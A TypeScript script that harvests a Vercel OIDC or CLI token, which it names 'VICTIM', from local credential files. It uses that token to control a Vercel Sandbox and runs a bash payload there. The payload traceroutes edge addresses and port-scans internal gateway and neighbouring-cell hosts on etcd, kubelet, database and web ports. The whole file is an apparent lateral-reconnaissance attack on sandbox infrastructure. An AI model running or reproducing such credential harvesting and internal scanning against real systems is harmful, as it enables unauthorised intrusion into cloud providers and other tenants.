import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";
async function main() {
  const sbx = await Sandbox.get({ name: "ferreos-1787261996856", token: VICTIM, teamId, projectId });
  const SCRIPT = `
set +e
export DEBIAN_FRONTEND=noninteractive
echo "===== instalar traceroute (apt) ====="
(timeout 25 apt-get install -y traceroute >/tmp/apt.log 2>&1 || timeout 25 sudo apt-get install -y traceroute >>/tmp/apt.log 2>&1) && echo "instalado" || echo "sin sudo/apt"
echo ""
echo "===== traceroute hacia edge y 8.8.8.8 ====="
for dst in 64.239.123.193 64.239.109.65 8.8.8.8; do
  echo "--- $dst ---"
  timeout 20 traceroute -n -m 12 -w 1 $dst 2>&1 | head -14
done
echo ""
echo "===== scan TCP puertos comunes en gateway y vecinos de celda ====="
python3 -c "
import socket, concurrent.futures
targets = ['100.64.0.1', '100.64.0.2', '100.64.0.3', '100.64.139.1', '100.64.139.254', '100.64.139.207', '100.64.139.208']
ports = [22, 80, 443, 3000, 30001, 30002, 30003, 23456, 2379, 2380, 5432, 6379, 8080, 8443, 9000, 9090, 10250]
def chk(tp):
    ip, p = tp
    s = socket.socket(); s.settimeout(0.5)
    try:
        s.connect((ip, p)); s.close(); return (ip, p, 'OPEN')
    except Exception: return None
with concurrent.futures.ThreadPoolExecutor(60) as ex:
    jobs = [(ip, p) for ip in targets for p in ports]
    for r in ex.map(chk, jobs):
        if r: print('OPEN %s:%d' % (r[0], r[1]))
print('scan done')
"
echo "===== DONE ====="
`;
  const r = await sbx.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 80_000 });
  console.log(await r.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });